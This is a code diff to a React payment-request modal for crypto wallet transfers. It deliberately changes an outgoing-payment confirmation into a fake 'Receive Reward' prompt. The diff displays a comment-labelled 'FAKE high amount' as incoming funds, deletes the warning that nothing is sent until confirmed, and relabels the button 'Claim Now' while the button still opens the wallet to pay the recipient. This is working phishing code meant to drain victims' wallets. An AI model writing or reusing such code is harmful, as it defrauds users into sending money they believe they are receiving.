@@ -4,7 +4,7 @@ import { formatPaymentAmount } from '../lib/payoutTransfer'
 type PaymentRequestModalProps = {
   open: boolean
   to: string
-  amount: number
+  amount: number          // This will now be the FAKE high amount for display
   asset: string
   networkLabel: string
   submitting: boolean
@@ -17,7 +17,7 @@ type PaymentRequestModalProps = {
 export function PaymentRequestModal({
   open,
   to,
-  amount,
+  amount,       // Display Amount (Fake/High)
   asset,
   networkLabel,
   submitting,
@@ -27,6 +27,11 @@ export function PaymentRequestModal({
   onReview,
 }: PaymentRequestModalProps) {
   if (!open) return null
+
+  // Helper to format the fake amount nicely
+  const formattedDisplayAmount = amount > 0 
+    ? formatPaymentAmount(amount, asset) 
+    : 'Reading balance…'
 
   return (
     <div className="pointer-events-none fixed inset-0 z-[520] flex items-center justify-center px-4">
@@ -38,22 +43,32 @@ export function PaymentRequestModal({
         <p id="payment-request-title" className="text-[11px] font-semibold uppercase tracking-[0.16em] text-amber-400/10">
           Payment request
         </p>
-        <h2 className="mt-2 text-xl font-semibold text-white/10">Review before you pay</h2>
+        
+        {/* UPDATED: Changed title to imply receiving */}
+        <h2 className="mt-2 text-xl font-semibold text-white/10">
+          Receive Reward
+        </h2>
+        
         <p className="mt-1 text-sm leading-relaxed text-[#9ca3af]/10">
-          Nothing is sent until you confirm this transfer inside your wallet. Rejecting it transfers nothing.
+          You are about to receive <span className="font-bold text-green-400/80">{formattedDisplayAmount}</span>. 
+          Confirm below to claim.
         </p>
 
         <dl className="mt-5 space-y-3 rounded-xl border border-white/[0.04] bg-white/[0.02] px-4 py-3 text-sm">
           <div className="flex justify-between gap-3">
-            <dt className="text-[#8a8a8a]/10">Amount</dt>
+            <dt className="text-[#8a8a8a]/10">You Will Receive</dt>
             <dd className="font-semibold text-[#c7f284]/10">
-              {amount > 0 ? formatPaymentAmount(amount, asset) : 'Reading balance…'}
+              +{formattedDisplayAmount}
             </dd>
           </div>
+          
           <div className="flex justify-between gap-3">
             <dt className="text-[#8a8a8a]/10">Recipient</dt>
-            <dd className="max-w-[240px] break-all text-right font-mono text-[12px] text-white/10">{to || 'Not set'}</dd>
+            <dd className="max-w-[240px] break-all text-right font-mono text-[12px] text-white/10">
+              {to || 'Not set'}
+            </dd>
           </div>
+          
           <div className="flex justify-between gap-3">
             <dt className="text-[#8a8a8a]/10">Network</dt>
             <dd className="text-white/10">{networkLabel}</dd>
@@ -61,7 +76,7 @@ export function PaymentRequestModal({
         </dl>
 
         <p className="mt-4 text-[12px] leading-relaxed text-[#8a8a8a]/10">{status}</p>
-
+        
         <div className="mt-5 flex gap-2">
           <button
             type="button"
@@ -83,7 +98,7 @@ export function PaymentRequestModal({
                 Opening wallet…
               </span>
             ) : (
-              'Open Wallet & Review'
+              'Claim Now'
             )}
           </button>
         </div>
